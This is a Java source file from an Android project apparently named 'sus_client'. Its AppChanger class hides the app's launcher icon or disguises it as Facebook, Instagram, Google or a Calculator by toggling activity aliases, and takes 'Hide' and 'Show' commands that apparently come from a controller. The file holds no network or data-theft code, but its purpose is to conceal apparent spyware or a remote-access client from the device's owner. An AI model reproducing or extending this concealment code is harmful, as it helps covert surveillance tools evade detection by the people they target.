package com.android.sus_client.applaunchers;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.util.Pair;

import com.android.sus_client.R;
import com.android.sus_client.commonutility.basic.Callback1;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class AppChanger {

    private static final Class<?> defaultLauncherActivity = ActionActivity.class;

    private static final String PREF_ALIAS_KEY = "susActiveAliasKey";
    private static final Pair<String, String> PREF_DEFAULT_VALUE = new Pair<>(defaultLauncherActivity.getName(), "Default");


    private final Context context;

    public static AppChanger getInstance(Context context) {
        return new AppChanger(context);
    }

    private AppChanger(Context context) {
        this.context = context;
    }

    private List<Pair<String, String>> getListOfAliasesPair() {
        List<Pair<String, String>> listOfAliasesPair = new ArrayList<>();
        listOfAliasesPair.add(new Pair<>("HideLauncher", "Hide"));
        listOfAliasesPair.add(new Pair<>("ShowLauncher", "Show"));
        listOfAliasesPair.add(new Pair<>(defaultLauncherActivity.getName(), "Default"));
        listOfAliasesPair.add(new Pair<>(Launcher1.class.getName(), "Facebook"));
        listOfAliasesPair.add(new Pair<>(Launcher2.class.getName(), "Instagram"));
        listOfAliasesPair.add(new Pair<>(Launcher3.class.getName(), "Google"));
        listOfAliasesPair.add(new Pair<>(Launcher4.class.getName(), "Calculator"));
        return listOfAliasesPair;
    }

    public void changeAppStyle(String name) {
        changeAppStyle(name, null);
    }

    public void changeAppStyle(String name, Callback1<String> callback) {
        Pair<String, String> newAliasPair = PREF_DEFAULT_VALUE;
        for (Pair<String, String> pair : getListOfAliasesPair()) {
            if (name != null && name.equalsIgnoreCase(pair.second.trim())) {
                newAliasPair = pair;
                break;
            }
        }

        String enabledAliasName = "";
        if (newAliasPair.first.equals("HideLauncher")) {
            setAppVisibility(context, getActiveAlias().first, false);

        } else if (newAliasPair.first.equals("ShowLauncher")) {
            String newAliasName = getActiveAlias().first;
            setAppVisibility(context, newAliasName, true);
            if (isAliasEnabled(context, newAliasName)) {
                enabledAliasName = newAliasName;
            }

        } else {
            enabledAliasName = enableActivityAlias(newAliasPair);
        }

        if (callback != null) {
            callback.onComplete(enabledAliasName);
        }
    }

    public Pair<String, String> getActiveAlias() {
        final List<Pair<String, String>> lstPair = getListOfAliasesPair();
        for (int i = 0; i < lstPair.size(); i++) {
            if (i != 0 && i != 1 && isAliasEnabled(context, lstPair.get(i).first)) {
                return lstPair.get(i);
            }
        }

        String savedAliasStr = PreferenceManager.getDefaultSharedPreferences(context).getString(PREF_ALIAS_KEY, pairToJson(PREF_DEFAULT_VALUE));
        return pairFromJson(savedAliasStr);
    }

    private String enableActivityAlias(Pair<String, String> newAliasPair) {
        String enabledAliasName = "";
        final List<Pair<String, String>> lstPair = getListOfAliasesPair();
        for (int i = 0; i < lstPair.size(); i++) {
            if (i != 0 && i != 1) {
                String aliasName = lstPair.get(i).first;
                if (lstPair.get(i).equals(newAliasPair)) {
                    if (!isAliasEnabled(context, newAliasPair.first)) {
                        aliasName = newAliasPair.first;
                        PreferenceManager.getDefaultSharedPreferences(context).edit().putString(PREF_ALIAS_KEY, pairToJson(newAliasPair)).apply();
                        // enable new displaying component
                        setAppVisibility(context, aliasName, true);
                    }
                } else {
                    // disable all previous active or inactive components
                    setAppVisibility(context, aliasName, false);
                }

                if (isAliasEnabled(context, aliasName)) {
                    enabledAliasName = aliasName;
                }
            }
        }
        return enabledAliasName;
    }

    /**
     * Global
     */
    private static String pairToJson(Pair<String, String> pair) {
        JSONObject json = new JSONObject();
        try {
            json.put("first", pair.first);
            json.put("second", pair.second);
        } catch (Exception ignored) {
        }
        return json.toString();
    }

    private static Pair<String, String> pairFromJson(String json) {
        JSONObject jsonObject;
        try {
            jsonObject = new JSONObject(json);
        } catch (Exception ignored) {
            jsonObject = new JSONObject();
        }
        return new Pair<>(jsonObject.optString("first"), jsonObject.optString("second"));
    }

    private static boolean isAliasEnabled(Context context, String aliasName) {
        ComponentName component = new ComponentName(context, aliasName);
        return context.getPackageManager().getComponentEnabledSetting(component) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private static void setAppVisibility(Context context, String aliasName, boolean visible) {
        try {
            ComponentName component = new ComponentName(context, aliasName);
            int ENABLED_STATE = visible ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            context.getPackageManager().setComponentEnabledSetting(component, ENABLED_STATE, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
    }

    public static void setAppVisibility(Context context, boolean visible) {
        try {
            int ENABLED_STATE = visible ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, defaultLauncherActivity), ENABLED_STATE, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
        //DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        //devicePolicyManager.setApplicationHidden(componentName, getPackageName(), enable);
    }

    public static int getLauncherIcon(String mAliasName) {
        int iconRes = 0;
        if (TextUtils.isEmpty(mAliasName)) return iconRes;
        if (Launcher1.class.getName().equals(mAliasName)) {
            iconRes = R.mipmap.sus_app_ic_facebook;
        } else if (Launcher2.class.getName().equals(mAliasName)) {
            iconRes = R.mipmap.sus_app_ic_instagram;
        } else if (Launcher3.class.getName().equals(mAliasName)) {
            iconRes = R.mipmap.sus_app_ic_google;
        } else if (Launcher4.class.getName().equals(mAliasName)) {
            iconRes = R.mipmap.sus_app_ic_calculator;
        }
        return iconRes;
    }

}